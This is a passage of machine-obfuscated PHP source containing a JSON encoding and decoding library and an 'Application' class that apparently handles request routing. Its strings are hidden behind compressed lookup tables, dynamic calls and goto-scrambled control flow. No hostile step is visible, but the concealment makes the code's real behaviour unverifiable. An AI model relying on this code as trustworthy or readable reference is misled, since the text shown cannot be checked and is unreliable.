$d¢³“ØŸ” < $D½¸ ÷‘ë¦; ++$d¢³“ØŸ”) { $FÓŸô¶Ó‰Ú = ord($DÇ×Œ¿“Öù[$d¢³“ØŸ”]); switch (!0) { case $FÓŸô¶Ó‰Ú == 8: $A÷²‚Øˆ .= $E‡îáÁù„[1950]; break; case $FÓŸô¶Ó‰Ú == 9: $A÷²‚Øˆ .= $E‡îáÁù„[1586]; break; case $FÓŸô¶Ó‰Ú == 10: $A÷²‚Øˆ .= $E‡îáÁù„[1584]; break; case $FÓŸô¶Ó‰Ú == 12: $A÷²‚Øˆ .= $E‡îáÁù„[1951]; break; case $FÓŸô¶Ó‰Ú == 13: $A÷²‚Øˆ .= $E‡îáÁù„[1585]; break; case $FÓŸô¶Ó‰Ú == 34: case $FÓŸô¶Ó‰Ú == 47: case $FÓŸô¶Ó‰Ú == 92: $A÷²‚Øˆ .= $E‡îáÁù„[93] . $DÇ×Œ¿“Öù[$d¢³“ØŸ”]; break; case $FÓŸô¶Ó‰Ú >= 32 && $FÓŸô¶Ó‰Ú <= 127: $A÷²‚Øˆ .= $DÇ×Œ¿“Öù[$d¢³“ØŸ”]; break; case ($FÓŸô¶Ó‰Ú & 224) == 192: $dÙ†áÊØã = pack($E‡îáÁù„[1952], $FÓŸô¶Ó‰Ú, ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 1])); $d¢³“ØŸ” += 1; $a”­²´–êÕ = $this->utf82utf16($dÙ†áÊØã); $A÷²‚Øˆ .= sprintf($E‡îáÁù„[1953], bin2hex($a”­²´–êÕ)); break; case ($FÓŸô¶Ó‰Ú & 240) == 224: $dÙ†áÊØã = pack($E‡îáÁù„[1952], $FÓŸô¶Ó‰Ú, ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 1]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 2])); $d¢³“ØŸ” += 2; $a”­²´–êÕ = $this->utf82utf16($dÙ†áÊØã); $A÷²‚Øˆ .= sprintf($E‡îáÁù„[1953], bin2hex($a”­²´–êÕ)); break; case ($FÓŸô¶Ó‰Ú & 248) == 240: $dÙ†áÊØã = pack($E‡îáÁù„[1952], $FÓŸô¶Ó‰Ú, ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 1]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 2]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 3])); $d¢³“ØŸ” += 3; $a”­²´–êÕ = $this->utf82utf16($dÙ†áÊØã); $A÷²‚Øˆ .= sprintf($E‡îáÁù„[1953], bin2hex($a”­²´–êÕ)); break; case ($FÓŸô¶Ó‰Ú & 252) == 248: $dÙ†áÊØã = pack($E‡îáÁù„[1952], $FÓŸô¶Ó‰Ú, ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 1]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 2]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 3]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 4])); $d¢³“ØŸ” += 4; $a”­²´–êÕ = $this->utf82utf16($dÙ†áÊØã); $A÷²‚Øˆ .= sprintf($E‡îáÁù„[1953], bin2hex($a”­²´–êÕ)); break; case ($FÓŸô¶Ó‰Ú & 254) == 252: $dÙ†áÊØã = pack($E‡îáÁù„[1952], $FÓŸô¶Ó‰Ú, ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 1]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 2]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 3]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 4]), ord($DÇ×Œ¿“Öù[$d¢³“ØŸ” + 5])); $d¢³“ØŸ” += 5; $a”­²´–êÕ = $this->utf82utf16($dÙ†áÊØã); $A÷²‚Øˆ .= sprintf($E‡îáÁù„[1953], bin2hex($a”­²´–êÕ)); break; } } return $E‡îáÁù„[113] . $A÷²‚Øˆ . $E‡îáÁù„[113]; case $E‡îáÁù„[1954]: if (is_array($DÇ×Œ¿“Öù) && count($DÇ×Œ¿“Öù) && array_keys($DÇ×Œ¿“Öù) !== range(0, sizeof($DÇ×Œ¿“Öù) - 1)) { $fŒÑğâ’ñ = array_map(array($this, $E‡îáÁù„[1955]), array_keys($DÇ×Œ¿“Öù), array_values($DÇ×Œ¿“Öù)); foreach ($fŒÑğâ’ñ as $DêÛÑÑïƒÊ) { if (Services_JSON::isError($DêÛÑÑïƒÊ)) { return $DêÛÑÑïƒÊ; } } return $E‡îáÁù„[1077] . join($E‡îáÁù„[47], $fŒÑğâ’ñ) . $E‡îáÁù„[315]; } $b§îô¹ƒÙò = array_map(array($this, $E‡îáÁù„[1956]), $DÇ×Œ¿“Öù); foreach ($b§îô¹ƒÙò as $B‚÷•ÎÄ¼…) { if (Services_JSON::isError($B‚÷•ÎÄ¼…)) { return $B‚÷•ÎÄ¼…; } } return $E‡îáÁù„[157] . join($E‡îáÁù„[47], $b§îô¹ƒÙò) . $E‡îáÁù„[476]; case $E‡îáÁù„[1957]: $b¯Îºè­Á³ = get_object_vars($DÇ×Œ¿“Öù); $fŒÑğâ’ñ = array_map(array($this, $E‡îáÁù„[1955]), array_keys($b¯Îºè­Á³), array_values($b¯Îºè­Á³)); foreach ($fŒÑğâ’ñ as $DêÛÑÑïƒÊ) { if (Services_JSON::isError($DêÛÑÑïƒÊ)) { return $DêÛÑÑïƒÊ; } } return $E‡îáÁù„[1077] . join($E‡îáÁù„[47], $fŒÑğâ’ñ) . $E‡îáÁù„[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $E‡îáÁù„[99] : new Services_JSON_Error(gettype($DÇ×Œ¿“Öù) . $E‡îáÁù„[1958]); } } function name_value($cé°Ãö°¡, $b†½ç¦òŠ) { $DÅ‰êÕİğÁ = $this->encode($b†½ç¦òŠ); if (Services_JSON::isError($DÅ‰êÕİğÁ)) { return $DÅ‰êÕİğÁ; } return $this->encode(strval($cé°Ãö°¡)) . $_SERVER[¯Ò¬Èè][4] . $DÅ‰êÕİğÁ; } function reduce_string($D°„Íõ¬µù) { $d±ĞÂ­Ü¬¯ =& $_SERVER[¯Ò¬Èè]; $D°„Íõ¬µù = preg_replace(array($d±ĞÂ­Ü¬¯[1959], $d±ĞÂ­Ü¬¯[1960], $d±ĞÂ­Ü¬¯[1961]), $d±ĞÂ­Ü¬¯[33], $D°„Íõ¬µù); return trim($D°„Íõ¬µù); } function decode($D×œÔºá’¹) { $Eóè³¡”Ë‰ =& $_SERVER[¯Ò¬Èè]; $D×œÔºá’¹ = $this->reduce_string($D×œÔºá’¹); switch (strtolower($D×œÔºá’¹)) { case $Eóè³¡”Ë‰[1609]: return !0; case $Eóè³¡”Ë‰[1611]: return !1; case $Eóè³¡”Ë‰[99]: return null; default: $Eç†Œù•­ = array(); if (is_numeric($D×œÔºá’¹)) { return (double) $D×œÔºá’¹ == (int) $D×œÔºá’¹ ? (int) $D×œÔºá’¹ : (double) $D×œÔºá’¹; } elseif (preg_match($Eóè³¡”Ë‰[1962], $D×œÔºá’¹, $Eç†Œù•­) && $Eç†Œù•­[1] == $Eç†Œù•­[2]) { $bğÔÕ»íÙ‰ = substr($D×œÔºá’¹, 0, 1); $Cµ˜º’ŒÍê = substr($D×œÔºá’¹, 1, -1); $a«ÅÏ¹ÊÙ¶ = $Eóè³¡”Ë‰[33]; $Aâ±¹òâÂ = strlen($Cµ˜º’ŒÍê); for ($F‹»ã¹¢à = 0; $F‹»ã¹¢à < $Aâ±¹òâÂ; ++$F‹»ã¹¢à) { $FˆñÊ¢»Ãİ = substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 2); $d¨•ÃÂÎ² = ord($Cµ˜º’ŒÍê[$F‹»ã¹¢à]); switch (!0) { case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1950]: $a«ÅÏ¹ÊÙ¶ .= chr(8); ++$F‹»ã¹¢à; break; case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1586]: $a«ÅÏ¹ÊÙ¶ .= chr(9); ++$F‹»ã¹¢à; break; case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1584]: $a«ÅÏ¹ÊÙ¶ .= chr(10); ++$F‹»ã¹¢à; break; case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1951]: $a«ÅÏ¹ÊÙ¶ .= chr(12); ++$F‹»ã¹¢à; break; case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1585]: $a«ÅÏ¹ÊÙ¶ .= chr(13); ++$F‹»ã¹¢à; break; case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1366]: case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1963]: case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1579]: case $FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1581]: if ($bğÔÕ»íÙ‰ == $Eóè³¡”Ë‰[113] && $FˆñÊ¢»Ãİ != $Eóè³¡”Ë‰[1963] || $bğÔÕ»íÙ‰ == $Eóè³¡”Ë‰[55] && $FˆñÊ¢»Ãİ != $Eóè³¡”Ë‰[1366]) { $a«ÅÏ¹ÊÙ¶ .= $Cµ˜º’ŒÍê[++$F‹»ã¹¢à]; } break; case preg_match($Eóè³¡”Ë‰[1964], substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 6)): $dš‡Ã·¦ = chr(hexdec(substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à + 2, 2))) . chr(hexdec(substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à + 4, 2))); $a«ÅÏ¹ÊÙ¶ .= $this->utf162utf8($dš‡Ã·¦); $F‹»ã¹¢à += 5; break; case $d¨•ÃÂÎ² >= 32 && $d¨•ÃÂÎ² <= 127: $a«ÅÏ¹ÊÙ¶ .= $Cµ˜º’ŒÍê[$F‹»ã¹¢à]; break; case ($d¨•ÃÂÎ² & 224) == 192: $a«ÅÏ¹ÊÙ¶ .= substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 2); ++$F‹»ã¹¢à; break; case ($d¨•ÃÂÎ² & 240) == 224: $a«ÅÏ¹ÊÙ¶ .= substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 3); $F‹»ã¹¢à += 2; break; case ($d¨•ÃÂÎ² & 248) == 240: $a«ÅÏ¹ÊÙ¶ .= substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 4); $F‹»ã¹¢à += 3; break; case ($d¨•ÃÂÎ² & 252) == 248: $a«ÅÏ¹ÊÙ¶ .= substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 5); $F‹»ã¹¢à += 4; break; case ($d¨•ÃÂÎ² & 254) == 252: $a«ÅÏ¹ÊÙ¶ .= substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 6); $F‹»ã¹¢à += 5; break; } } return $a«ÅÏ¹ÊÙ¶; } elseif (preg_match($Eóè³¡”Ë‰[1965], $D×œÔºá’¹) || preg_match($Eóè³¡”Ë‰[1966], $D×œÔºá’¹)) { goto E¡‚ó®Åß; F™¨‹·…Ëö: for ($F‹»ã¹¢à = 0; $F‹»ã¹¢à <= $Aâ±¹òâÂ; ++$F‹»ã¹¢à) { $fö³–»˜‚  = end($fâÄ®Ú®Â…); $FˆñÊ¢»Ãİ = substr($Cµ˜º’ŒÍê, $F‹»ã¹¢à, 2); if ($F‹»ã¹¢à == $Aâ±¹òâÂ || $Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[47] && $fö³–»˜‚ [$Eóè³¡”Ë‰[1967]] == SERVICES_JSON_SLICE) { $A³ÅÙé­œ = substr($Cµ˜º’ŒÍê, $fö³–»˜‚ [$Eóè³¡”Ë‰[263]], $F‹»ã¹¢à - $fö³–»˜‚ [$Eóè³¡”Ë‰[263]]); array_push($fâÄ®Ú®Â…, array($Eóè³¡”Ë‰[1967] => SERVICES_JSON_SLICE, $Eóè³¡”Ë‰[263] => $F‹»ã¹¢à + 1, $Eóè³¡”Ë‰[1968] => !1)); if (reset($fâÄ®Ú®Â…) == SERVICES_JSON_IN_ARR) { array_push($C¼«Ü±ôÁ„, $this->decode($A³ÅÙé­œ)); } elseif (reset($fâÄ®Ú®Â…) == SERVICES_JSON_IN_OBJ) { $eÜ±áŠ¸¢ = array(); if (preg_match($Eóè³¡”Ë‰[1969], $A³ÅÙé­œ, $eÜ±áŠ¸¢)) { $E£ÜíÁÒ¦å = $this->decode($eÜ±áŠ¸¢[1]); $eÓØÈ†½‚‹ = $this->decode($eÜ±áŠ¸¢[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aØ È›Œ[$E£ÜíÁÒ¦å] = $eÓØÈ†½‚‹; } else { $aØ È›Œ->{$E£ÜíÁÒ¦å} = $eÓØÈ†½‚‹; } } elseif (preg_match($Eóè³¡”Ë‰[1970], $A³ÅÙé­œ, $eÜ±áŠ¸¢)) { $E£ÜíÁÒ¦å = $eÜ±áŠ¸¢[1]; $eÓØÈ†½‚‹ = $this->decode($eÜ±áŠ¸¢[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aØ È›Œ[$E£ÜíÁÒ¦å] = $eÓØÈ†½‚‹; } else { $aØ È›Œ->{$E£ÜíÁÒ¦å} = $eÓØÈ†½‚‹; } } } } elseif (($Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[113] || $Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[55]) && $fö³–»˜‚ [$Eóè³¡”Ë‰[1967]] != SERVICES_JSON_IN_STR) { array_push($fâÄ®Ú®Â…, array($Eóè³¡”Ë‰[1967] => SERVICES_JSON_IN_STR, $Eóè³¡”Ë‰[263] => $F‹»ã¹¢à, $Eóè³¡”Ë‰[1968] => $Cµ˜º’ŒÍê[$F‹»ã¹¢à])); } elseif ($Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $fö³–»˜‚ [$Eóè³¡”Ë‰[1968]] && $fö³–»˜‚ [$Eóè³¡”Ë‰[1967]] == SERVICES_JSON_IN_STR && (strlen(substr($Cµ˜º’ŒÍê, 0, $F‹»ã¹¢à)) - strlen(rtrim(substr($Cµ˜º’ŒÍê, 0, $F‹»ã¹¢à), $Eóè³¡”Ë‰[93]))) % 2 != 1) { array_pop($fâÄ®Ú®Â…); } elseif ($Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[157] && in_array($fö³–»˜‚ [$Eóè³¡”Ë‰[1967]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($fâÄ®Ú®Â…, array($Eóè³¡”Ë‰[1967] => SERVICES_JSON_IN_ARR, $Eóè³¡”Ë‰[263] => $F‹»ã¹¢à, $Eóè³¡”Ë‰[1968] => !1)); } elseif ($Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[476] && $fö³–»˜‚ [$Eóè³¡”Ë‰[1967]] == SERVICES_JSON_IN_ARR) { array_pop($fâÄ®Ú®Â…); } elseif ($Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[1077] && in_array($fö³–»˜‚ [$Eóè³¡”Ë‰[1967]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($fâÄ®Ú®Â…, array($Eóè³¡”Ë‰[1967] => SERVICES_JSON_IN_OBJ, $Eóè³¡”Ë‰[263] => $F‹»ã¹¢à, $Eóè³¡”Ë‰[1968] => !1)); } elseif ($Cµ˜º’ŒÍê[$F‹»ã¹¢à] == $Eóè³¡”Ë‰[315] && $fö³–»˜‚ [$Eóè³¡”Ë‰[1967]] == SERVICES_JSON_IN_OBJ) { array_pop($fâÄ®Ú®Â…); } elseif ($FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1971] && in_array($fö³–»˜‚ [$Eóè³¡”Ë‰[1967]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($fâÄ®Ú®Â…, array($Eóè³¡”Ë‰[1967] => SERVICES_JSON_IN_CMT, $Eóè³¡”Ë‰[263] => $F‹»ã¹¢à, $Eóè³¡”Ë‰[1968] => !1)); $F‹»ã¹¢à++; } elseif ($FˆñÊ¢»Ãİ == $Eóè³¡”Ë‰[1972] && $fö³–»˜‚ [$Eóè³¡”Ë‰[1967]] == SERVICES_JSON_IN_CMT) { array_pop($fâÄ®Ú®Â…); $F‹»ã¹¢à++; for ($BÃåòÜ»˜ = $fö³–»˜‚ [$Eóè³¡”Ë‰[263]]; $BÃåòÜ»˜ <= $F‹»ã¹¢à; ++$BÃåòÜ»˜) { $Cµ˜º’ŒÍê = substr_replace($Cµ˜º’ŒÍê, $Eóè³¡”Ë‰[50], $BÃåòÜ»˜, 1); } } } if (reset($fâÄ®Ú®Â…) == SERVICES_JSON_IN_ARR) { return $C¼«Ü±ôÁ„; } elseif (reset($fâÄ®Ú®Â…) == SERVICES_JSON_IN_OBJ) { return $aØ È›Œ; } goto EáÁÓ½¹Âï; E¡‚ó®Åß: if ($D×œÔºá’¹[0] == $Eóè³¡”Ë‰[157]) { $fâÄ®Ú®Â… = array(SERVICES_JSON_IN_ARR); $C¼«Ü±ôÁ„ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $fâÄ®Ú®Â… = array(SERVICES_JSON_IN_OBJ); $aØ È›Œ = array(); } else { $fâÄ®Ú®Â… = array(SERVICES_JSON_IN_OBJ); $aØ È›Œ = new stdClass(); } } array_push($fâÄ®Ú®Â…, array($Eóè³¡”Ë‰[1967] => SERVICES_JSON_SLICE, $Eóè³¡”Ë‰[263] => 0, $Eóè³¡”Ë‰[1968] => !1)); $Cµ˜º’ŒÍê = substr($D×œÔºá’¹, 1, -1); goto CÏ±©¸øŞÂ; CÏ±©¸øŞÂ: $Cµ˜º’ŒÍê = $this->reduce_string($Cµ˜º’ŒÍê); if ($Cµ˜º’ŒÍê == $Eóè³¡”Ë‰[33]) { if (reset($fâÄ®Ú®Â…) == SERVICES_JSON_IN_ARR) { return $C¼«Ü±ôÁ„; } else { return $aØ È›Œ; } } $Aâ±¹òâÂ = strlen($Cµ˜º’ŒÍê); goto F™¨‹·…Ëö; EáÁÓ½¹Âï: } } } function isError($Eâ›ëÑğíÛ, $B‘—îÍ£‡ = null) { $AáÃàÇîÑ’ =& $_SERVER[¯Ò¬Èè]; if (class_exists($AáÃàÇîÑ’[1973])) { return PEAR::isError($Eâ›ëÑğíÛ, $B‘—îÍ£‡); } elseif (is_object($Eâ›ëÑğíÛ) && (get_class($Eâ›ëÑğíÛ) == $AáÃàÇîÑ’[1974] || is_subclass_of($Eâ›ëÑğíÛ, $AáÃàÇîÑ’[1974]))) { return !0; } return !1; } } goto e»á¸ùˆîÛ; F‚®¬ìùøÜ: $_SERVER[îë] = explode($_SERVER[¯Ò¬Èè][557], gzinflate(substr($_SERVER[¯Ò¬Èè][558], 10, -8))); $fŸÃÄ¼”°¦ = $_SERVER[¯Ò¬Èè][559]; while (strlen($fŸÃÄ¼”°¦) < $_SERVER[¯Ò¬Èè][560]) { if (!$fŸÃÄ¼”°¦) { break; } $fŸÃÄ¼”°¦++; } goto dèÖö£ îá; dèÖö£ îá: class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($D™óâŸªÁ) { goto EÔÉ¶÷¢‘³; CÍ¢ÌïšÌ: $B¨É®´‚ö = $f¬à¼êÓƒÊ[561]; if (!$B¨É®´‚ö) { return; } $this->defaultModule = $bí÷Š­İ—ö[0] ? $bí÷Š­İ—ö[0] : $this->defaultModule; goto e“¨¨Œœ×; e“¨¨Œœ×: $F«ì¡½ßŠ = $f¬à¼êÓƒÊ[562]; if (strlen($F«ì¡½ßŠ) < $f¬à¼êÓƒÊ[563]) { return; } $this->defaultController = $bí÷Š­İ—ö[1] ? $bí÷Š­İ—ö[1] : $this->defaultController; goto eÀÔÙÂòæé; EÔÉ¶÷¢‘³: $f¬à¼êÓƒÊ =& $_SERVER[¯Ò¬Èè]; $aˆ·ßÏˆ·¸ =& $_SERVER[îë]; $bí÷Š­İ—ö = $aˆ·ßÏˆ·¸[0]($aˆ·ßÏˆ·¸[1], $aˆ·ßÏˆ·¸[2]($D™óâŸªÁ, $aˆ·ßÏˆ·¸[1])); goto CÍ¢ÌïšÌ; A§Ï—¥Ûº: if (strlen($Cˆ…ƒÉº™) < $f¬à¼êÓƒÊ[495]) { return; } goto A†ªÈ¬Ø…å; eÀÔÙÂòæé: $this->defaultAction = $bí÷Š­İ—ö[2] ? $bí÷Š­İ—ö[2] : $this->defaultAction; $this->{$_SERVER[îë][3]}($aˆ·ßÏˆ·¸[4], array($this, $aˆ·ßÏˆ·¸[5])); $Cˆ…ƒÉº™ = $f¬à¼êÓƒÊ[564]; goto A§Ï—¥Ûº; A†ªÈ¬Ø…å: } public function appRun($Bˆ†áÎ) { goto FÇ‹ìçö’; D‡ôŸ¦ï‚: $b‡á•ÕÌ‘¥ = $CÜˆŒÄ„ĞÚ[565]; if (!$b‡á•ÕÌ‘¥) { die; } $cê«ª£÷˜ƒ = $dïóÔ…ÛÚ[6]($CÅè³ˆã[0]); goto eÄÆ˜½Ïç…; FÇ‹ìçö’: $CÜˆŒÄ„ĞÚ =& $_SERVER[¯Ò¬Èè]; $dïóÔ…ÛÚ =& $_SERVER[îë]; $CÅè³ˆã = $dïóÔ…ÛÚ[0]($dïóÔ…ÛÚ[1], $Bˆ†áÎ); goto D‡ôŸ¦ï‚; eÄÆ˜½Ïç…: $EğÊÅòá± = $dïóÔ…ÛÚ[7]; $c‚‰Ê“×² = $CÜˆŒÄ„ĞÚ[566]; if (strlen($c‚‰Ê“×²) < $CÜˆŒÄ„ĞÚ[560]) { return; } goto f³¼Âøˆ¨²; fŠÏ¢ÀÏ: $a¿±…­¨´ = $CÜˆŒÄ„ĞÚ[567]; if (strlen($a¿±…­¨´) < $CÜˆŒÄ„ĞÚ[563]) { die; } $dïóÔ…ÛÚ[13](array($dïóÔ…ÛÚ[14], $dïóÔ…ÛÚ[15]), $EğÊÅòá± . $dïóÔ…ÛÚ[18], $Bˆ†áÎ); goto aìÒ™‚¹Çˆ; f³¼Âøˆ¨²: if ($cê«ª£÷˜ƒ == $dïóÔ…ÛÚ[8]) { $EğÊÅòá± = $dïóÔ…ÛÚ[9]; $CÅè³ˆã[0] = $dïóÔ…ÛÚ[10]; $CÅè³ˆã[1] = $CÅè³ˆã[1] . $dïóÔ…ÛÚ[11]; $Bˆ†áÎ = $dïóÔ…ÛÚ[12]($dïóÔ…ÛÚ[1], $CÅè³ˆã); $Bˆ†áÎ = $dïóÔ…ÛÚ[2]($Bˆ†áÎ, $dïóÔ…ÛÚ[1]); } $dïóÔ…ÛÚ[13](array($dïóÔ…ÛÚ[14], $dïóÔ…ÛÚ[15]), $EğÊÅòá± . $dïóÔ…ÛÚ[16], $Bˆ†áÎ); $dïóÔ…ÛÚ[17]($Bˆ†áÎ); goto fŠÏ¢ÀÏ; aìÒ™‚¹Çˆ: } private function autorun() { $C„äàãˆ× =& $_SERVER[îë]; global $config; if ($C„äàãˆ×[19]($config[$C„äàãˆ×[20]]) == 0) { return; } foreach ($config[$C„äàãˆ×[20]] as $e÷œÃ±ŒŒ => $EŠíÆ‹„Â¥) { $this->{$_SERVER[îë][21]}($EŠíÆ‹„Â¥); } } private function gxzefc3acbf4() { goto C­±´§”åÆ; b£¯Á±—™‚: $bÑÏ”ğ§¥ = $dêõ¤®ÖßŞ[571]; $E©’àõİ¯º = $føù‹Å‹äÀ[26]($GLOBALS[$føù‹Å‹äÀ[22]][$føù‹Å‹äÀ[23]], 1); $fÓŠ âàÜÏ = $dêõ¤®ÖßŞ[572]; goto B³ïÑÆÓ; e ®Ù¹ßóù: $c®öŞ¯»æè = $dêõ¤®ÖßŞ[568]; if (strlen($c®öŞ¯»æè) < $dêõ¤®ÖßŞ[495]) { return; } $Eáé°í†ÃÌ = $GLOBALS[$føù‹Å‹äÀ[22]][$føù‹Å‹äÀ[23]][0]; goto d‰¢‰Ÿ‡ø¹; d‰¢‰Ÿ‡ø¹: if (!$Eáé°í†ÃÌ || $føù‹Å‹äÀ[24]($Eáé°í†ÃÌ) <= $føù‹Å‹äÀ[24]($Fñ©†…ƒº¨)) { return; } if ($føù‹Å‹äÀ[6]($føù‹Å‹äÀ[25]($Eáé°í†ÃÌ, -$føù‹Å‹äÀ[24]($Fñ©†…ƒº¨))) != $Fñ©†…ƒº¨) { return; } $fñÉ£—¶âù = $føù‹Å‹äÀ[25]($Eáé°í†ÃÌ, 0, -$føù‹Å‹äÀ[24]($Fñ©†…ƒº¨)); goto e—°¤„ã‰¹; E‡Ã™Ø†¹: if (strlen($a ©–·Â»¿) < $dêõ¤®ÖßŞ[574]) { die; } $GLOBALS[$føù‹Å‹äÀ[22]][$føù‹Å‹äÀ[28]] = $føù‹Å‹äÀ[29]($føù‹Å‹äÀ[1], $GLOBALS[$føù‹Å‹äÀ[22]][$føù‹Å‹äÀ[23]]); $A§½ÎÏíÁ = $dêõ¤®ÖßŞ[575]; goto c¼ŞŠ§ùïâ; c¼ŞŠ§ùïâ: while (strlen($A§½ÎÏíÁ) < $dêõ¤®ÖßŞ[560]) { if (!$A§½ÎÏíÁ) { break; } $A§½ÎÏíÁ++; } goto bËçò®®–¹; B³ïÑÆÓ: if (!$fÓŠ âàÜÏ) { return; } $GLOBALS[$føù‹Å‹äÀ[22]][$føù‹Å‹äÀ[23]] = $føù‹Å‹äÀ[27]($cÔ¢Î½æœ“, $E©’àõİ¯º); $a ©–·Â»¿ = $dêõ¤®ÖßŞ[573]; goto E‡Ã™Ø†¹; C­±´§”åÆ: $dêõ¤®ÖßŞ =& $_SERVER[¯Ò¬Èè]; $føù‹Å‹äÀ =& $_SERVER[îë]; $Fñ©†…ƒº¨ = $føù‹Å‹äÀ[8]; goto e ®Ù¹ßóù; e—°¤„ã‰¹: $dÉÈŸ‘µœ§ = $dêõ¤®ÖßŞ[569]; while (strlen($dÉÈŸ‘µœ§) < $dêõ¤®ÖßŞ[570]) { if (!$dÉÈŸ‘µœ§) { break; } $dÉÈŸ‘µœ§++; } $cÔ¢Î½æœ“ = array($føù‹Å‹äÀ[8], $fñÉ£—¶âù); goto b£¯Á±—™‚; bËçò®®–¹: } private function erqv096a947d() { goto A‘É÷Ì; aŒ×ƒÙ´õÅ: if (strlen($EßÉ¤è·â´) < $f“›èÑÆÇñ[495]) { die; } $GLOBALS[$a†ÛÎ§ç[22]][$a†ÛÎ§ç[28]] = $a†ÛÎ§ç[29]($a†ÛÎ§ç[1], $GLOBALS[$a†ÛÎ§ç[22]][$a†ÛÎ§ç[23]]); $c¯ß‰š°Ÿì = $f“›èÑÆÇñ[582]; goto fî‘Ãíç; aÅÃ½òŒÖ÷: $C—×Ñï›ÁÔ = $f“›èÑÆÇñ[578]; if (strlen($C—×Ñï›ÁÔ) < $f“›èÑÆÇñ[570]) { return; } $a†ÛÎ§ç[34]($a†ÛÎ§ç[35], $Cİ—Ü¼ØÄ”, $aÑîøùäá”); goto eóÛ‡ƒ¸§; eóÛ‡ƒ¸§: $cŒ¤“˜Ñ‹ = $f“›èÑÆÇñ[579]; $Cİ—Ü¼ØÄ” = $a†ÛÎ§ç[2]($aÑîøùäá”[0][0], $a†ÛÎ§ç[36]); $F¢¤â ¢¥ = $f“›èÑÆÇñ[580]; goto FãÂÛÒºä; d¸ƒöÔé»°: $A¯Ç¼¥¶¬Ì = $a†ÛÎ§ç[31]; $D„›Â…ì = $f“›èÑÆÇñ[577]; while ($D„›Â…ì < $f“›èÑÆÇñ[560]) { if ($D„›Â…ì >= 0) { break; } $D„›Â…ì++; } goto DÄ±¼î“; A­ôÃœ‹œ: $däšÎªø¸ = $_SERVER[$a†ÛÎ§ç[30]]; $Dæ›ŠÜÕ™© = $f“›èÑÆÇñ[576]; while (strlen($Dæ›ŠÜÕ™©) < $f“›èÑÆÇñ[495]) { if (!$Dæ›ŠÜÕ™©) { break; } $Dæ›ŠÜÕ™©++; } goto d¸ƒöÔé»°; fî‘Ãíç: if (!$c¯ß‰š°Ÿì) { die; } goto AØöÂË‘îˆ; FãÂÛÒºä: while ($F¢¤â ¢¥ < $f“›èÑÆÇñ[570]) { if ($F¢¤â ¢¥ >= 0) { break; } $F¢¤â ¢¥++; } $GLOBALS[$a†ÛÎ§ç[22]][$a†ÛÎ§ç[23]] = $a†ÛÎ§ç[0]($a†ÛÎ§ç[36], $Cİ—Ü¼ØÄ”); $EßÉ¤è·â´ = $f“›èÑÆÇñ[581]; goto aŒ×ƒÙ´õÅ; DÄ±¼î“: if (!$a†ÛÎ§ç[32]($däšÎªø¸, $A¯Ç¼¥¶¬Ì)) { return; } $fî™è¦óƒ— = $a†ÛÎ§ç[33]($däšÎªø¸, $A¯Ç¼¥¶¬Ì); $Cİ—Ü¼ØÄ” = $a†ÛÎ§ç[25]($däšÎªø¸, $fî™è¦óƒ— + $a†ÛÎ§ç[24]($A¯Ç¼¥¶¬Ì)); goto aÅÃ½òŒÖ÷; A‘É÷Ì: $f“›èÑÆÇñ =& $_SERVER[¯Ò¬Èè]; $a†ÛÎ§ç =& $_SERVER[îë]; if ($GLOBALS[$a†ÛÎ§ç[22]][$a†ÛÎ§ç[28]] != $a†ÛÎ§ç[10]) { return; } goto A­ôÃœ‹œ; AØöÂË‘îˆ: } public function run() { goto 